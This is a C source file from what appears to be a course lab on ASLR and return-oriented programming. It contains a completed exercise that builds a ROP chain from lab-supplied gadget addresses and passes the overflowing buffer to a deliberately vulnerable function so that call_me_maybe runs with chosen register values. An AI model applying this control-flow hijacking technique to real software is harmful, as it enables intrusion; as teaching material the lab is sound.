/*
 * Address Space Layout Randomization
 * Part 2B: ROP
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdint.h>
#include "lab.h"

// No win method this time!
extern void vulnerable(char *your_string);

// Call this via a ROP chain to win:
extern void call_me_maybe(uint64_t rdi, uint64_t rsi, uint64_t rdx);

// Here's some gadgets for you (see gadgets.s):
extern void gadget1();
extern void gadget2();
extern void gadget3();
extern void gadget4();
extern void gadget5();
extern void gadget6();

/*
 * lab_code
 * Your code for part 1 goes here!
 */
void lab_code() {
	// Same deal as Part 2A, except this time there's no win() method to call directly!
	uint64_t your_string[128];

	// Fill the array with 0xFF's and set the last character to be a new line.
	memset(your_string, 0xFF, sizeof(your_string));
	your_string[127] = 0x000000000000000A;
	//your_string[127] = 191;

	// For now we don't worry about ASLR, we can directly use these addresses:
	uint64_t gadget1_addr = (uint64_t)&gadget1;
	uint64_t gadget2_addr = (uint64_t)&gadget2;
	uint64_t gadget3_addr = (uint64_t)&gadget3;
	uint64_t gadget4_addr = (uint64_t)&gadget4;
	uint64_t gadget5_addr = (uint64_t)&gadget5;
	uint64_t gadget6_addr = (uint64_t)&gadget6;
	uint64_t call_me_maybe_addr = (uint64_t)&call_me_maybe;

	// Part 2B: Fill in your_string such that it configures the arguments
	// to call_me_maybe correctly, and then calls call_me_maybe.

	int i = 3;

    // rdi = 2
    your_string[i++] = gadget3_addr; // rdi=0
    your_string[i++] = gadget5_addr; // rdi=1
    your_string[i++] = gadget5_addr; // rdi=2

    // rsi = 2*rdi
    your_string[i++] = gadget6_addr; // rsi = rdi (2)
    your_string[i++] = gadget2_addr; // rsi <<= 1 -> 4

    // rdx = 1337
    your_string[i++] = gadget1_addr; // pop rax
    your_string[i++] = 191;          // value to pop into rax
    your_string[i++] = gadget4_addr; // rdx = rax*7 (→ 1337)

    // call the target function
    your_string[i++] = call_me_maybe_addr;


	// Recall that arg1 is rdi, arg2 is rsi, and arg3 is rdx.
	// See gadgets.s for the gadget definitions.

	vulnerable((char *)your_string);
}
